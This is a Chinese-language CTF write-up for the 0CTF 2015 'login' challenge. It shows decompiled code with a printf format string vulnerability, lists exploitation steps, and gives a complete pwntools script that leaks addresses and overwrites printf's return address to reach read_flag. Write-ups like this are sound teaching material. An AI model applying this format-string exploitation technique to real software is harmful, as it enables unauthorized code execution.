---
layout: post
title: "0ctf.login"
date: 2015-08-23 08:40:28 -0700
comments: true
categories: 
---

#0ctf.login

##0x00 源程序

https://github.com/ctfs/write-ups-2015/tree/master/0ctf-2015/exploit/login

##0x01 分析
拖入ida中分析存在选项4，查看选项4可以发现一个格式化字符串漏洞，如下

	  v7 = *MK_FP(__FS__, 40LL);
	  printf("Login: ");
	  scanf_s((__int64)&s1, 256);
	  printf("Password: ", 256LL);
	  scanf_s((__int64)&s, 256);
	  v0 = strlen(&s);
	  MD5(&s, v0, &v4);
	  v1 = (__int64)"root";
	  if ( !strcmp(&s1, "root") )
	  {
	    v1 = (__int64)"0ops{secret_MD5}";
	    if ( !memcmp(&v4, "0ops{secret_MD5}", 0x10uLL) )
	      read_flag();
	  }
	  printf(&s1, v1);
	  puts(" login failed.");
	  puts("1 chance remaining.");
	  printf("Login: ");
	  scanf_s((__int64)&s1, 256);
	  printf("Password: ", 256LL);
	  scanf_s((__int64)&s, 256);
	  v2 = strlen(&s);
	  MD5(&s, v2, &v4);
	  v3 = (__int64)"root";
	  if ( !strcmp(&s1, "root") )
	  {
	    v3 = (__int64)"0ops{secret_MD5}";
	    if ( !memcmp(&v4, "0ops{secret_MD5}", 0x10uLL) )
	      read_flag();
	  }
	  printf(&s1, v3);
	  puts(" login failed.");
	  puts("Threat detected. System shutdown.");
	  exit(1);
	}
##0x02 漏洞利用

1，先用%x泄露栈和代码段的地址
2. 在局部变量中构造printf函数的返回地址
3，再次利用格式化字符串漏洞，将read_flag函数的地址写入printf的返回地址

##0x03 payload


	from pwn import *
	from binascii import *

	add = 'aaaaaaa'

	r = process("./login")
	#r = remote("127.0.0.1", 9999)

	f = open("input", "w")

	def wf(m):
		m += '\n'
		f.write(m)


	def login():
		print r.recvuntil("Login:")
		r.sendline("guest")
		wf("guest")
		print r.recvuntil("Password:")
		r.sendline("guest123")
		wf("guest123")

	def opt2(m):
		print r.recvuntil("choice:")
		r.sendline("2")
		wf("2")
		print r.recvuntil("username:")
		r.sendline(m)
		wf(m)

	def opt4(m):
		print r.recvuntil("choice:")
		r.sendline("4")
		wf("4")
		print r.recvuntil("Login:")
		r.sendline(m)
		wf(m)
		print r.recvuntil("Password:")
		r.sendline("aaaa")
		wf("aaaa")

	def pay(data):
		print r.recvuntil("Login:")
		r.sendline( data )
		wf( data )
		print r.recvuntil("Password:")
		r.sendline("aaaa")
		wf("aaaa")

	def pay2(data):
		r.sendline( data )
		wf( data )
		print r.recvuntil("Password:")
		r.sendline("aaaa")
		wf("aaaa")


	login()
	opt2('a' * 256)
	opt4("%12$llx--%22$llx")
	data = r.recvuntil("Login:")
	print '----------'
	print data
	print '----------'

	printf_ret_addr =  ( int( data[1: 13], 16 ) + 0xe2d8 -0xe510 )
	readflag =  ( int( data[15: 27], 16 ) + 0xfb3 -0xba0 )
	print '[+]hexpringf_ret_addr ',hex(printf_ret_addr) 
	print '[+]hexreadflag', hex(readflag) 
	print '[+]readflag', hex(readflag)[-4:]
	count = int( hex(readflag)[-4:], 16)
	print '[+]printf_ret_addr', hex( printf_ret_addr ) 

	printf_ret_addr =  p64( printf_ret_addr & 0xffffffffffffffff )
	readflag = p64( readflag & 0xffffffffffffffff )

	print '[+]pay2',b2a_hex("%" + str( count ) + "x-%12$nAAAAAAAAAAAAAAAAAAA" + printf_ret_addr )
	pay2("%" + str( count ) + "x-%12$hnAAAAAAAAAAA" + add +  printf_ret_addr )

	f.close()
	r.interactive()

